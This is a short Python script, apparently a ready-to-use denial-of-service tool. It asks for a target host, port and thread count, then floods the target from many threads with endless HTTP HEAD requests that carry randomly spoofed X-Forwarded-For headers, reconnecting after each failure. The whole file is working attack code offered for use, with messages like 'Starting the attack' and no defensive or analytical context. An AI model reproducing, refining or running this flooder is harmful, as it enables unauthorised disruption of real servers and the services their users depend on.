import socket
import os, sys
import time
import threading, random
from os import urandom as randbytes

os.system('cls||clear')

print('''
╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗  ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗
╚═╗║ ║║  ╠╩╗║╣  ║   ║║║║╣  ║ ╠═╣║ ║ ║║
╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩   ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝
		 -- Works on HTTP and IP--
	 					[L4 & L7]
''')
ip = input("IP/Domain: ")
port = int(input("Port: "))
th = int(input("Threads: "))

url = "http://" + str(ip)


def randomip():
	randip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
	return (randip)


print("[>>>] Starting the attack [<<<]")

inf = 1000000000


def attack():
	connection = "Connection: Keep-Alive\r\n"
	referer = "Referer: null\r\n"
	forward = "X-Forwarded-For: " + randomip() + "\r\n"
	get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
	request = get_host + referer + connection + forward + "\r\n\r\n"
	try:
		atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		atk.connect((ip, port))
	except:
		print("Cannot connect, Try a different port.")
	for i in range(1, inf):
		try:
			atk.send(str.encode(request))
		except:
			try:
				atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				atk.connect((ip, port))
			except:
				print("Downed or lost connection.")


def threader():
	global threads
	threads = []
	for i in range(th):
		t = threading.Thread(target=attack)
		threads.append(t)
		t.start()


threader()
